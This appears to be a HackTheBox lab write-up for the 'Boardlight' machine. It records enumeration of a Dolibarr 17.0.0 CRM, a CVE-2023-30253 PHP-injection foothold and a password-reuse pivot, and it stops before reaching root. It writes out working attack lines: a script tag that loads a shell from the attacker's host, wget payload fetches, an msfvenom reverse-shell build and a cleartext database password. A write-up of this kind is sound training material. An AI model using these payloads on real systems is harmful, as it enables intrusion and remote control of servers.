# HTB - Boardlight

#HTB #Boardlight #Dolibarr #CVE-2023-30253 #PHP #PasswordReuse #vhost #Easy

Target: 10.129.87.244 (`board.htb`)

## Services

- 22/tcp  ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
- 80/tcp  http   Apache httpd 2.4.41 (Ubuntu) — site has no title

```
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Versions

- Ubuntu · Apache 2.4.41 · PHP
- **Dolibarr 17.0.0** on the `crm` subdomain

## Enumeration

### board.htb (main site)

Every input on the main site is a dead end — worth recording so the time isn't spent twice:

| Feature | Result |
|---|---|
| Email / contact form | Doesn't appear to send params |
| Newsletter signup | Doesn't appear to send params |
| Search icon | Doesn't appear to send params; trailing `?` only |

### crm.board.htb (vhost)

Dolibarr 17.0.0 ERP/CRM.

Login probing:

- `admin:admin` — reaches an internal page but returns **access denied**
- `admin:password` — redirects back to login
- `user:user` — redirects back to login
- "Forgot password" and "Need help" present; the latter links off-site only

`robots.txt`:

```
User-agent: *
Allow: /public/agenda/agendaexport.php
Allow: /public/demo/
Allow: /public/members/new.php
Allow: /index.php
#Allow: /$
Disallow: /
```

## Findings

**Dolibarr ≤ 17.0.0 — CVE-2023-30253, PHP code injection → reverse shell.**

- Exploit: [nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

Manual path via the CMS **Website** module — create a page (e.g. `test`) and inject:

```html
<Script src="http://10.10.14.85:8001/shell.php"></script>
```

Dolibarr blocks some dynamic PHP outright:

```
You add dynamic PHP code that contains the PHP instruction 'proc_open' that is
forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx
to increase list of allowed commands).
```

## Foothold

```bash
# attacker — serve payloads
python3 -m http.server 8001

# on target
wget http://10.10.14.85:8001/linpeas.sh

# alternative payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.85 LPORT=5555 -f elf -o reverse-sh.elf
```

## Creds

Dolibarr config on disk (`conf.php`) — database credentials in cleartext:

```php
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
$dolibarr_main_authentication='dolibarr';
```

- `dolibarrowner:serverfun2$2023!!` — Dolibarr DB
- **`larissa:serverfun2$2023!!` — password reuse**, the pivot from web-service user to a real system account

## Privesc

`linpeas` → Linux Exploit Suggester candidates (kernel/sudo, "probable"):

```
[+] [CVE-2022-0847] DirtyPipe
    https://dirtypipe.cm4all.com/          ubuntu=(20.04|21.04), debian=11
    https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-3156] sudo Baron Samedit
    https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
    mint=19, ubuntu=18|20, debian=10

[+] [CVE-2021-3156] sudo Baron Samedit 2
    centos=6|7|8, ubuntu=14|16|17|18|19|20, debian=9|10

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
    https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
    ubuntu=20.04 {kernel:5.8.0-*}  — requires ip_tables module loaded
```

SGID binaries found:

```
-rwsr-sr-x 1 root root    15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root mail    23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwxr-sr-x 1 root shadow  43K Jan 10 05:55 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow  43K Jan 10 05:55 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root mail    15K Aug 26  2019 /usr/bin/mlock
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow  31K Feb  6 04:49 /usr/bin/expiry
-rwxr-sr-x 1 root shadow  83K Feb  6 04:49 /usr/bin/chage
-rwxr-sr-x 1 root ssh    343K Jan  2  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty     15K Mar 30  2020 /usr/bin/bsd-write
```

> [!warning] **The record ends here.** The original notes stop at the SGID listing — no root was documented, and none of the suggester CVEs were marked as tried. The `larissa` password-reuse pivot is the last confirmed step.

## Users

- `larissa` — system account reached via Dolibarr DB password reuse
